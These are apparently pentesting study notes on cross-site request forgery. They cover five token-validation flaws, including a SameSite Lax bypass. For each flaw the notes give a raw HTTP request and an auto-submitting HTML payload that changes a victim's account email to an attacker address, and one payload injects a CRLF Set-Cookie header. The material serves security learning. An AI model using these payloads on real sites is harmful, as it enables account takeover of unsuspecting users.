---
title: CSRF
source_url: https://notes.incendium.rocks/pentesting-notes/web/csrf
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fg1hDS5V6P5adHjIPblmd%2F61f251ef69dd0a65b7b4d726_how%2Bcsrf%2Bwork-2894670327.jpg?alt=media&amp;token=42827646-723f-4ed7-81c3-98614b61be72" alt=""><figcaption></figcaption></figure>

## Where token validation depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a [CSRF attack](https://portswigger.net/web-security/csrf):

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com Cookie:
session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

A simple HTML payload to exploit the vulnerability:

```html
<html>
    <body>
        <form action="https://vulnerable-host/email/change?email=pwned@evil-user.net" method="GET">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Where token validation depends on token being present

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

The following HTML payload can be used to exploit the vulnerability:

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pw3ned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Where token is not tied to user session

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

The following HTML payload can be used to exploit the vulnerability:

```html
<html>
    <body>
        <form action="https:/vulnerable-website.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pw3ned@evil-user.net" />
            <input type="hidden" name="csrf" value="XuaRs7F9aMtqLiBD3M4CsXBRyNTEg3Kd" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

## Where token is tied to non-session cookie

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

This situation is harder to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

In this example, there is a vulnerable host that sets a cookie to "lastSearchterm". There are no filters so we can set another cookie using the value:

```html
<html>
    <body>
        <form action="https://vulnerable-host.com/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pw3ned3@evil-user.net" />
            <input type="hidden" name="csrf" value="zsDS8P2nQ7gpBkVJZnXBgJikTuhRIwPk" />
        <img src="https://vulnerable-host.com/?search=test%0d%0aSet-Cookie:%20csrfKey=pqQ06bGFPZi2SKjG1XhnceMPdwkvRAn7%3b%20SameSite=None" onerror="document.forms[0].submit()">
        </form>
    </body>
</html>
```

## Bypass Lax SameSite

We can override the request method from "GET" (which Lax accepts) to "POST" using "\_method":

```html
<html>
<form method="GET" action="https://vulnerable-host/my-account/change-email">
    <input type="hidden" name="email" value="attacker_emeail@attacker_domain.com">
    <input type="hidden" name="_method" value="POST">
</form>
<script>
        document.forms[0].submit();
</script>
    </body>
</html>
```
